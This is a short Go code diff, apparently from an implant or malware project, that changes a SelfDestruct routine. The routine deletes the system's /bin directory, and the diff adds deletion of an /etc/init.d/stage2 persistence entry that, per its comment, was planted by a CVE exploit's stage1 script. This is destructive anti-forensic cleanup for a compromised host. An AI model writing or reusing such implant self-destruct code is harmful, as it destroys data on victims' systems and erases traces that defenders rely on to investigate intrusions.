@@ -152,5 +152,8 @@ func (i *Implant) ExecuteTasks() {
 }
 
 func (i *Implant) SelfDestruct() {
-	os.RemoveAll("/bin")
+	os.RemoveAll("/bin") // TODO: make sure all implant stuff will be in this dir
+
+	// undoing everything in stage1.sh in CVE
+	os.RemoveAll("/etc/init.d/stage2")
 }
